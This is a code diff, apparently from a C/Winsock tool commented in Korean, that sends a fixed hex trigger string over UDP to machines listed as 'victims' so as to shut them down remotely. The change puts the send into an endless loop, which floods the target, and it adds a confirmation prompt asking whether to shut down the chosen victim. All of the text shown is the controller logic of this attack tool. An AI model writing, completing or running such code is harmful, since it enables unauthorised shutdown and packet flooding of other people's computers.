@@ -164,28 +164,33 @@ int shutdownMessageSender(int number)
 		err_quit("socket()");
 
 	//원격 IP, Port번호를 설정한다.
-	SOCKADDR_IN remoteaddr = { 0 };
-	remoteaddr.sin_family = AF_INET;
-	remoteaddr.sin_addr.s_addr = inet_addr(victimList[number - 1]);
-	remoteaddr.sin_port = htons(SHUTDOWNPORT);
+	SOCKADDR_IN victimaddr = { 0 };
+	victimaddr.sin_family = AF_INET;
+	victimaddr.sin_addr.s_addr = inet_addr(victimList[number - 1]);
+	victimaddr.sin_port = htons(SHUTDOWNPORT);
 
 	//통신에 사용할 변수를 선언한다.
 	SOCKADDR_IN peeraddr;
 	int addrlen = sizeof(peeraddr);
 	char buffer[70] = { '\0' };
 
-	//송신할 데이터를 복사한다.
-	strcpy_s(buffer, sizeof(buffer), "F39422345DF99D2EAD885FA4E80CF0AD3554D8600C33B5F0B158B54E9B67AFFD");
+	while (1)
+	{
+		//송신할 데이터를 복사한다.
+		strcpy_s(buffer, sizeof(buffer), "F39422345DF99D2EAD885FA4E80CF0AD3554D8600C33B5F0B158B54E9B67AFFD");
 
-	//데이터를 전송한다.
-	retval = sendto(sock, buffer, (int)strlen(buffer) + 1, 0, (SOCKADDR*)& remoteaddr, sizeof(remoteaddr));
-	if (retval == SOCKET_ERROR)
-		err_quit("sendto()");
+		//데이터를 송신한다.
+		retval = sendto(sock, buffer, (int)strlen(buffer) + 1, 0, (SOCKADDR*)& victimaddr, sizeof(victimaddr));
+		if (retval == SOCKET_ERROR)
+			err_quit("sendto()");
+	}
 
 	//통신용 소켓을 닫는다.
 	retval = closesocket(sock);
 	if (retval != 0)
 		err_display("closesocket()");
+
+	return 0;
 }
 
 //피해자 컴퓨터를 종료시키는 함수
@@ -207,8 +212,9 @@ int shutdownVictim()
 
 	//입력한 피해자를 다시 한번 확인한다.
 	printf("\n");
-	printf("%d. %s", number, victimList[number - 1]);
+	printf("%d. %s\n", number, victimList[number - 1]);
 	printf("해당 피해자를 종료할까요? (Y/N): ");
+	while (getchar() != '\n');
 	char input[10];
 	gets_s(input, sizeof(input));
 
